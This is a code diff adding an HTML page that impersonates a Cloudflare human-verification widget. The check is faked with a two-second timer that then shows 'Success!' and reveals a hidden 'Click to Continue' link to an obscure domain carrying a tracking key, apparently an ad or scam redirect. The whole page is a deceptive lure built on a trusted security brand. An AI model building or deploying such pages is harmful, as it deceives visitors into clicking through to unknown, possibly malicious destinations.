@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verification Required</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            background-color: #f9f9f9;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+        }
+
+        .verification-card {
+            background: white;
+            border: 1px solid #e0e0e0;
+            border-radius: 4px;
+            padding: 12px 16px;
+            width: 100%;
+            max-width: 320px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            transition: all 0.3s ease;
+        }
+
+        .left-section {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #0052cc;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        /* Success Check (Hidden initially) */
+        .success-check {
+            display: none;
+            width: 24px;
+            height: 24px;
+            color: #22c55e;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .text-label {
+            color: #313131;
+            font-size: 15px;
+            font-weight: 400;
+        }
+
+        .brand-section {
+            display: flex;
+            flex-direction: column;
+            align-items: flex-end;
+            opacity: 0.8;
+        }
+
+        .logo-text {
+            font-weight: 700;
+            font-size: 11px;
+            letter-spacing: 0.5px;
+            color: #000;
+            display: flex;
+            align-items: center;
+            gap: 4px;
+        }
+
+        .logo-cloud {
+            color: #f48120;
+            font-size: 14px;
+        }
+
+        .links {
+            font-size: 9px;
+            color: #666;
+            margin-top: 2px;
+        }
+
+        #continue-btn {
+            display: none;
+            margin-top: 20px;
+            width: 100%;
+            max-width: 320px;
+            background-color: #0563c1;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            border-radius: 4px;
+            text-decoration: none;
+            font-weight: 500;
+            font-size: 14px;
+            animation: fadeIn 0.5s forwards;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="flex flex-col items-center w-full px-4">
+        <!-- Verification Widget -->
+        <div class="verification-card" id="widget">
+            <div class="left-section">
+                <div id="status-icon" class="spinner"></div>
+                <span id="status-text" class="text-label">Verifying you are human</span>
+            </div>
+            
+            <div class="brand-section">
+                <div class="logo-text">
+                    <svg class="logo-cloud" width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M17.5,19c-3.03,0-5.5-2.47-5.5-5.5c0-0.12,0.01-0.24,0.02-0.36C10.6,13.06,9.15,13,8,13c-2.76,0-5,2.24-5,5s2.24,5,5,5h9.5 c2.48,0,4.5-2.02,4.5-4.5S19.98,14,17.5,14c-0.14,0-0.28,0.01-0.42,0.02C17.03,13.85,17,13.68,17,13.5c0-2.48,2.02-4.5,4.5-4.5 s4.5,2.02,4.5,4.5S23.98,18,21.5,18c-0.14,0-0.28-0.01-0.42-0.02C21.03,18.15,21.05,18.32,21.05,18.5c0,3.03-2.47,5.5-5.5,5.5H17.5z" />
+                    </svg>
+                    CLOUDFLARE
+                </div>
+                <div class="links">Privacy • Terms</div>
+            </div>
+        </div>
+
+        <!-- Hidden Continue Button -->
+        <a href="https://exasperatebubblyorthodox.com/nx0mqssqb?key=3b6c383d0fe4dfbd2cebe336916a95f1" id="continue-btn">
+            Click to Continue
+        </a>
+    </div>
+
+    <script>
+        window.onload = function() {
+            const statusIcon = document.getElementById('status-icon');
+            const statusText = document.getElementById('status-text');
+            const continueBtn = document.getElementById('continue-btn');
+
+            // Simulate verification process (2 seconds)
+            setTimeout(() => {
+                // Change icon to success checkmark
+                statusIcon.classList.remove('spinner');
+                statusIcon.innerHTML = `
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round" style="color: #22c55e;">
+                        <polyline points="20 6 9 17 4 12"></polyline>
+                    </svg>
+                `;
+                
+                statusText.innerText = "Success!";
+                
+                // Show the continue button
+                continueBtn.style.display = 'block';
+            }, 2000);
+        };
+    </script>
+
+</body>
+</html>
